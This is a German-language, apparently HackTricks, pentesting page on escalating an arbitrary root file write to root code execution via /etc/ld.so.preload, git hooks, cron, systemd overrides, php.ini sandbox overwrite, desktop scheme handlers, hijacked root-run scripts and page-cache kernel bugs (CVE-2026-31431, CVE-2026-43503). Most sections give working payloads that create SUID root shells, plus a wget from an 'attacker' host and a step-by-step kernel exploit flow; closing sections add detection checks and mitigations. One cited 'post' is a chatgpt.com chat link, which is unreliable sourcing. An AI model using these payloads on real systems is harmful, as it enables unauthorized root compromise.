# Beliebiges Schreiben von Dateien als Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Diese Datei verhält sich wie die **`LD_PRELOAD`**-Umgebungsvariable, funktioniert jedoch auch in **SUID-Binaries**.\
Wenn du sie erstellen oder ändern kannst, musst du lediglich einen **Pfad zu einer Library hinzufügen, die** mit jedem ausgeführten Binary **geladen wird**.

Zum Beispiel: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sind **Skripte**, die bei verschiedenen **Ereignissen** in einem Git-Repository **ausgeführt** werden, etwa wenn ein Commit erstellt oder ein Merge durchgeführt wird. Wenn also ein **privilegiertes Skript oder ein privilegierter Benutzer** diese Aktionen regelmäßig durchführt und es möglich ist, **in den Ordner `.git` zu schreiben**, kann dies für **privesc** genutzt werden.

Zum Beispiel ist es möglich, ein **Skript** in einem Git-Repo unter **`.git/hooks`** zu **erstellen**, sodass es immer ausgeführt wird, wenn ein neuer Commit erstellt wird:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron- und Zeitdateien

Wenn du **in Cron-bezogene Dateien schreiben kannst, die von root ausgeführt werden**, kannst du normalerweise Code ausführen, sobald der Job das nächste Mal läuft. Interessante Ziele sind:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Die eigene Crontab von root in `/var/spool/cron/` oder `/var/spool/cron/crontabs/`
- `systemd`-Timer und die von ihnen ausgelösten Services

Schnellüberprüfungen:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Typische Missbrauchspfade:

- **Einen neuen root-Cronjob** an `/etc/crontab` oder eine Datei in `/etc/cron.d/` **anhängen**
- **Ein bereits von `run-parts` ausgeführtes Script ersetzen**
- **Ein bestehendes Timer-Ziel mit einer Backdoor versehen**, indem das von ihm gestartete Script oder Binary verändert wird

Minimales Cron-Payload-Beispiel:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Wenn du nur in ein von `run-parts` verwendetes Cron-Verzeichnis schreiben kannst, lege stattdessen dort eine ausführbare Datei ab:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Hinweise:

- `run-parts` ignoriert normalerweise Dateinamen, die Punkte enthalten. Bevorzuge daher Namen wie `backup` statt `backup.sh`.
- Einige Distros verwenden `anacron` oder `systemd`-Timer anstelle des klassischen cron. Die Idee des Missbrauchs ist jedoch dieselbe: **Ändere, was root später ausführen wird**.

### Service- und Socket-Dateien

Wenn du **`systemd`-Unit-Dateien** oder von ihnen referenzierte Dateien beschreiben kannst, ist es möglicherweise möglich, durch das Neuladen und Neustarten der Unit oder durch das Warten auf das Auslösen des Service-/Socket-Aktivierungspfads Codeausführung als root zu erreichen.

Interessante Ziele sind:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in-Overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Service-Skripte/-Binärdateien, auf die durch `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` verwiesen wird
- Beschreibbare `EnvironmentFile=`-Pfade, die von einem root-Service geladen werden

Schnelle Prüfungen:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Häufige Missbrauchswege:

- **`ExecStart=` überschreiben** in einer root-owned Service-Unit, die du ändern kannst
- **Einen drop-in override hinzufügen** mit einem malicious `ExecStart=` und zuvor den alten Eintrag löschen
- Das bereits von der Unit referenzierte Script/Binary **backdooren**
- Einen **socket-activated service hijacken**, indem du die zugehörige `.service`-Datei änderst, die gestartet wird, sobald der Socket eine Verbindung empfängt

Beispiel für einen malicious override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Typischer Aktivierungsablauf:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Wenn du Services nicht selbst neu starten kannst, aber eine socket-aktivierte Unit bearbeiten kannst, musst du möglicherweise nur **auf eine Client-Verbindung warten**, um die Ausführung des mit einer Backdoor versehenen Services als root auszulösen.

### Eine restriktive `php.ini` überschreiben, die von einer privilegierten PHP-Sandbox verwendet wird

Einige benutzerdefinierte Daemons validieren von Benutzern bereitgestelltes PHP, indem sie `php` mit einer **restriktiven `php.ini`** ausführen (zum Beispiel `disable_functions=exec,system,...`). Wenn der Sandbox-Code noch über **eine beliebige Schreibprimitive** (wie `file_put_contents`) verfügt und du den **exakten `php.ini`-Pfad** erreichen kannst, der vom Daemon verwendet wird, kannst du diese **Konfiguration überschreiben**, um die Einschränkungen aufzuheben, und anschließend ein zweites Payload übermitteln, das mit erhöhten Privilegien ausgeführt wird.<sup>[[2]](#references)</sup>

Typischer Ablauf:

1. Das erste Payload überschreibt die Sandbox-Konfiguration.
2. Das zweite Payload führt Code aus, nachdem gefährliche Funktionen wieder aktiviert wurden.

Minimales Beispiel (ersetze den vom Daemon verwendeten Pfad):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Wenn der Daemon als root ausgeführt wird (oder mit Pfaden validiert, die root gehören), liefert die zweite Ausführung einen Root-Kontext. Dies ist im Wesentlichen eine **Privilege Escalation durch Überschreiben der Konfiguration**, wenn die sandboxed Runtime weiterhin Dateien schreiben kann.

### binfmt_misc

Die Datei in `/proc/sys/fs/binfmt_misc` gibt an, welches Binary welche Dateitypen ausführen soll. TODO: Die Voraussetzungen prüfen, um dies auszunutzen und beim Öffnen eines üblichen Dateityps eine Rev-Shell auszuführen.

### Schema-Handler überschreiben (wie http: oder https:)

Ein Angreifer mit Schreibberechtigungen für die Konfigurationsverzeichnisse eines Opfers kann problemlos Dateien ersetzen oder erstellen, die das Systemverhalten ändern und dadurch unbeabsichtigte Codeausführung bewirken. Durch Ändern der Datei `$HOME/.config/mimeapps.list`, sodass HTTP- und HTTPS-URL-Handler auf eine schädliche Datei verweisen (z. B. durch Setzen von `x-scheme-handler/http=evil.desktop`), stellt der Angreifer sicher, dass **das Anklicken eines beliebigen http- oder https-Links den in dieser `evil.desktop`-Datei angegebenen Code ausführt**. Nachdem der folgende schädliche Code in `evil.desktop` unter `$HOME/.local/share/applications` platziert wurde, führt jeder Klick auf eine externe URL den eingebetteten Befehl aus:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Weitere Informationen finden Sie in [**diesem Beitrag**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49), in dem dies zum Ausnutzen einer echten Schwachstelle verwendet wurde.

### Von root ausgeführte, vom Benutzer beschreibbare Scripts/Binaries

Wenn ein privilegierter Workflow etwas wie `/bin/sh /home/username/.../script` ausführt (oder eine beliebige Binary innerhalb eines Verzeichnisses, das einem nicht privilegierten Benutzer gehört), können Sie dies hijacken:<sup>[[1]](#references)</sup>

- **Die Ausführung erkennen:** Überwachen Sie Prozesse mit [pspy](https://github.com/DominicBreuker/pspy), um root beim Aufrufen von benutzergesteuerten Pfaden zu erkennen:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Schreibbarkeit bestätigen:** Stelle sicher, dass sowohl die Zieldatei als auch ihr Verzeichnis deinem Benutzer gehören und von ihm beschreibbar sind.
- **Ziel hijacken:** Sichere das ursprüngliche Binary/Script und lege ein Payload ab, das eine SUID-Shell (oder eine andere Root-Aktion) erstellt. Stelle anschließend die Berechtigungen wieder her:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Die privilegierte Aktion auslösen** (z. B. durch Drücken einer UI-Schaltfläche, die den Helper startet). Wenn root den hijackten Pfad erneut ausführt, die eskalierte Shell mit `./rootshell -p` übernehmen.

### Nur im Page-Cache erfolgende Änderung privilegierter Binaries

Einige Kernel-Bugs ändern die Datei **nicht auf der Festplatte**. Stattdessen ermöglichen sie nur die Änderung der **Page-Cache-Kopie einer lesbaren Datei**. Wenn du ein **setuid**- oder anderweitig **von root ausgeführtes** Binary als Ziel verwenden kannst, kann die nächste Ausführung vom Angreifer kontrollierte Bytes aus dem Speicher ausführen und die Privilegien eskalieren, obwohl der Datei-Hash auf der Festplatte unverändert ist.

Dies lässt sich als **nur zur Laufzeit vorhandenes File-Write-Primitive** verstehen:

- **Die Festplatte bleibt sauber**: Inode und Bytes auf der Festplatte ändern sich nicht
- **Der Speicher ist verändert**: Prozesse, die die gecachte Page lesen oder ausführen, erhalten den vom Angreifer veränderten Inhalt
- **Der Effekt ist temporär**: Die Änderung verschwindet nach einem Neustart oder der Entfernung aus dem Cache

Dieses Primitive liegt zwischen einem klassischen **arbitrary file write** und älteren **Page-Cache-Abuse**-Bugs wie Dirty COW / Dirty Pipe:

- Dirty COW basierte auf einer Race Condition
- Dirty Pipe hatte Einschränkungen bei der Schreibposition
- Ein reines Page-Cache-Primitive kann zuverlässiger sein, wenn der verwundbare Pfad direkte Schreibvorgänge in gecachte, dateigestützte Pages ermöglicht

#### Generischer privesc-Ablauf

1. Ein Kernel-Primitive beschaffen, das in **dateigestützte Page-Cache-Pages** schreiben kann
2. Dieses gegen ein **lesbares privilegiertes Binary** oder eine andere von root ausgeführte Datei einsetzen
3. Die Ausführung **auslösen, bevor die Page aus dem Cache entfernt wird**
4. Codeausführung als root erhalten, während die Datei auf der Festplatte weiterhin unverändert aussieht

Typische Ziele mit hohem Wert:

- **setuid-root**-Binaries
- Helper, die von **root-Services** gestartet werden
- Binaries, die häufig aus **Containern mit gemeinsam genutztem Host-Kernel/Page-Cache** ausgeführt werden

#### Beispielpfad mit AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) ist ein gutes Beispiel für diese Klasse. Der verwundbare Pfad lag in der Linux-Userspace-API für Kryptografie (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` kann Referenzen auf Page-Cache-Pages aus einer lesbaren Datei in die Crypto-TX-Scatterlist verschieben
- der In-Place-`algif_aead`-Decrypt-Pfad verwendete Quell- und Zielpuffer erneut
- `authencesn` schrieb anschließend in die Ziel-Tag-Region
- wenn diese Region weiterhin auf dateigestützte Pages aus dem `splice()` verwies, landete der Schreibvorgang im **Page-Cache der Zieldatei**

Die interessante Technik ist also nicht die CVE selbst, sondern das Muster:

- **dateigestützte Cache-Pages in ein Kernel-Subsystem einspeisen**
- das Subsystem dazu bringen, sie als **beschreibbaren Output** zu behandeln
- eine kleine, kontrollierte Überschreibung im Speicher auslösen

Der öffentliche PoC verwendete wiederholte **4-Byte-Schreibvorgänge**, um `/usr/bin/su` im Speicher zu patchen und anschließend auszuführen.

#### Beispielpfad mit ESP / XFRM + netfilter-TEE-Klon

DirtyClone (CVE-2026-43503) zeigt eine weitere Variante desselben Musters für **reines Page-Cache-Schreiben nach root**, diesmal jedoch mit **IPsec-ESP-Decrypt** statt `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Die wichtige Technik ist der Schritt des **Metadaten-Laundering**:

- `splice()` platziert eine **schreibgeschützte dateigestützte Page-Cache-Page** in einem ESP-in-UDP-Paket
- die ursprüngliche DirtyFrag-Mitigation markierte das skb mit `SKBFL_SHARED_FRAG`, damit `esp_input()` vor dem Entschlüsseln eine **Kopie erstellt**
- netfilter `TEE` dupliziert das Paket über `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- der Klon behält dieselbe **physische Page-Cache-Referenz**, verliert jedoch `SKBFL_SHARED_FRAG`
- `esp_input()` behandelt den Klon anschließend als sicher und führt die **In-Place-Entschlüsselung** mit `cbc(aes)` über die dateigestützte Page aus

Die Lehre für Reviewer geht daher über die CVE hinaus: Wenn eine Mitigation von **skb-/Page-Metadaten** abhängt, um zu entscheiden, ob eine Operation zuerst eine Kopie erstellen muss, kann jeder **Klon-/Kopierpfad, der die zugrunde liegende Page beibehält, aber die Metadaten entfernt**, das Schreib-Primitive unbemerkt erneut öffnen.

Typischer Exploit-Ablauf:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` ausführen, um **`CAP_NET_ADMIN` innerhalb eines privaten Network-Namespace** zu erhalten
2. Loopback aktivieren und eine **netfilter-`TEE`-Regel** in `mangle/OUTPUT` installieren
3. **XFRM-ESP-Transport-SAs** über `NETLINK_XFRM` installieren
4. jedes anvisierte 4-Byte-Wort im SA-Feld `seq_hi` kodieren (DirtyFrags Trick zur W Auswahl)
5. das gesplicte ESP-in-UDP-Paket senden, damit der **TEE-Klon** `esp_input()` erreicht und die Entschlüsselung **In-Place** ausführt
6. wiederholen, bis die Page-Cache-Kopie von `/usr/bin/su` oder einem anderen privilegierten Executable vom Angreifer kontrollierten Code enthält

In der Praxis entspricht die Auswirkung dem `AF_ALG`-Beispiel: Die Datei auf der Festplatte bleibt sauber, aber `execve()` verwendet die **veränderten Page-Cache-Bytes** und liefert root.

Nützliche Exposure-Checks für diese Variante:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Die kurzfristige Reduzierung der Angriffsfläche ist auch hier pfadspezifisch: Ein Upgrade auf einen Kernel mit `48f6a5356a33` behebt den Clone-Pfad, während das Blockieren des automatischen Ladens von `xt_TEE` den **Flag-Laundering-Schritt** entfernt und das Blockieren von `esp4` / `esp6` das **Entschlüsselungsziel** entfernt.

#### Exposition und Hunting

Wenn du diese Fehlerklasse vermutest, verlasse dich nicht nur auf Integritätsprüfungen der Festplatte. Überprüfe außerdem:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` kann als Modul geladen bzw. entladen werden
- `CONFIG_CRYPTO_USER_API_AEAD=y`: Die Schnittstelle ist in den Kernel integriert
- setuid-Binaries sind gute Ziele, da ein Patch, der nur den Page Cache betrifft, aus einem lokalen Foothold möglicherweise Root-Zugriff machen kann

#### Reduzierung der Angriffsfläche für den `algif_aead`-Pfad

Wenn die verwundbare Schnittstelle von einem ladbaren Modul bereitgestellt wird:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Wenn es in den Kernel kompiliert wird, wurde berichtet, dass einige Disclosures den init-Pfad blockieren, und zwar mit:
```bash
initcall_blacklist=algif_aead_init
```
Diese Art der mitigation sollte auch bei anderen Kernel-LPEs im Gedächtnis bleiben: Wenn die exploitation von einem bestimmten optionalen Interface abhängt, kann das Deaktivieren oder Blacklisting dieses Interfaces den exploit path unterbrechen, noch bevor ein vollständiges Kernel-Upgrade verfügbar ist.

## Referenzen

- [1] [HTB Bamboo – Hijacking eines als root ausgeführten Scripts in einem benutzerbeschreibbaren PaperCut-Verzeichnis](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Openwall-oss-security-Disclosure für CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux-stable-Fix: crypto: algif_aead – Rückkehr zum Betrieb out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail – CVE-2026-31431-Advisory](https://copy.fail/)
- [7] [Technischer Writeup von Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone-Repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Analyse und exploitation der Linux-LPE-Variante DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux-Fix: net: skb: `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` beibehalten (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Frühere Linux-Mitigation: `SKBFL_SHARED_FRAG` für gesplicete UDP-Pakete setzen (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)

{{#include ../../banners/hacktricks-training.md}}
